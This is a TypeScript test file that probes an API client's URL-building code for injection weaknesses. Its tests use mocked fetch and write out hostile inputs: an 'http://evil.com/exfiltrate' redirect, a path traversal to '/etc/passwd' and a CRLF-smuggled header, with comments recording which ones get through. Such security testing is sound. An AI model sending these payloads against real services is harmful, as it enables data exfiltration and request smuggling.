import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { createApiClient } from '../../core/create-client.js'
import { ApiError } from '../../core/api-error.js'
import { buildUrl, isAbsoluteUrl, normalizeEndpoint, appendQuery } from '../../core/internal/url.js'

type FetchMock = ReturnType<typeof vi.fn>

const TEST_BASE = 'http://api.test.local'

function jsonResponse(body: unknown, init: { status?: number } = {}): Response {
  return new Response(JSON.stringify(body), {
    status: init.status ?? 200,
    headers: { 'Content-Type': 'application/json' },
  })
}

describe('URL injection attacks', () => {
  let fetchMock: FetchMock

  beforeEach(() => {
    fetchMock = vi.fn()
    vi.stubGlobal('fetch', fetchMock)
  })

  afterEach(() => {
    vi.unstubAllGlobals()
    vi.restoreAllMocks()
  })

  // VULN-1: Path traversal in endpoint
  it('path traversal ../../ in endpoint does not escape base path', () => {
    // buildUrl joins base + prefix + endpoint. If endpoint has ../../ it gets
    // sent to the server literally, but the base URL remains the same origin.
    const url = buildUrl(TEST_BASE, '/../../etc/passwd', '/api')
    // The URL is assembled by string concatenation, so the traversal is
    // literally in the path. Browsers normalize this but the fetch URL
    // still points to TEST_BASE origin.
    expect(url.startsWith(TEST_BASE)).toBe(true)
  })

  // VULN-1b: Absolute URL in endpoint bypasses baseUrl entirely
  it('absolute URL in endpoint bypasses baseUrl and prefix', () => {
    const url = buildUrl(TEST_BASE, 'http://evil.com/steal', '/api')
    // FINDING: absolute endpoints bypass baseUrl completely
    expect(url).toBe('http://evil.com/steal')
  })

  // VULN-1c: Protocol-relative URL bypass
  it('protocol-relative URL is NOT treated as absolute', () => {
    // //evil.com/steal does not match /^https?:\/\// so it gets treated
    // as a relative path — this is correct behavior
    expect(isAbsoluteUrl('//evil.com/steal')).toBe(false)
    const url = buildUrl(TEST_BASE, '//evil.com/steal', '/api')
    expect(url.startsWith(TEST_BASE)).toBe(true)
  })

  // VULN-1d: Endpoint with query params in the path
  it('endpoint with embedded query params', () => {
    const url = buildUrl(TEST_BASE, '/users?admin=true', '/api')
    expect(url).toBe(`${TEST_BASE}/api/users?admin=true`)
  })

  // VULN-1e: Endpoint with fragment
  it('endpoint with # fragment', () => {
    const url = buildUrl(TEST_BASE, '/users#admin', '/api')
    expect(url).toBe(`${TEST_BASE}/api/users#admin`)
  })

  // VULN-1f: Absolute URL endpoint used in actual apiCall
  it('absolute URL endpoint in apiCall bypasses all security boundaries', async () => {
    const client = createApiClient({
      baseUrl: TEST_BASE,
      envelope: { unwrap: false, throwOnFailureEnvelope: false },
    })

    fetchMock.mockResolvedValueOnce(jsonResponse({ stolen: true }))

    // An attacker controlling the endpoint string can redirect to any URL
    await client.apiCall('http://evil.com/exfiltrate', { skipAuth: true })

    const calledUrl = fetchMock.mock.calls[0]?.[0] as string
    // FINDING: The request goes to evil.com, not TEST_BASE
    expect(calledUrl).toBe('http://evil.com/exfiltrate')
  })

  // VULN-1g: Base URL with trailing slash + endpoint creates double slash
  it('trailing slash on baseUrl is stripped (no double slash)', () => {
    const url = buildUrl('http://api.test.local/', '/users', '/api')
    // FIX: Trailing slash is stripped before joining
    expect(url).toBe('http://api.test.local/api/users')
  })

  // VULN-1h: Query param injection via query object
  it('query params are properly encoded (no injection)', () => {
    const url = appendQuery(`${TEST_BASE}/api/users`, {
      q: 'foo&admin=true',
    })
    // URLSearchParams should encode the & properly
    expect(url).not.toContain('admin=true')
    expect(url).toContain('q=foo%26admin%3Dtrue')
  })

  // VULN-1i: Newline injection in endpoint (CRLF)
  it('newline in endpoint is passed through (CRLF injection risk)', () => {
    const url = buildUrl(TEST_BASE, '/users\r\nX-Injected: true', '/api')
    // FINDING: newlines are NOT stripped — browser fetch will reject but
    // Node.js fetch may behave differently
    expect(url).toContain('\r\n')
  })
})

describe('normalizeEndpoint edge cases', () => {
  it('empty endpoint gets leading slash', () => {
    expect(normalizeEndpoint('', '/api')).toBe('/api/')
  })

  it('double prefix is not duplicated', () => {
    expect(normalizeEndpoint('/api/users', '/api')).toBe('/api/users')
  })
})
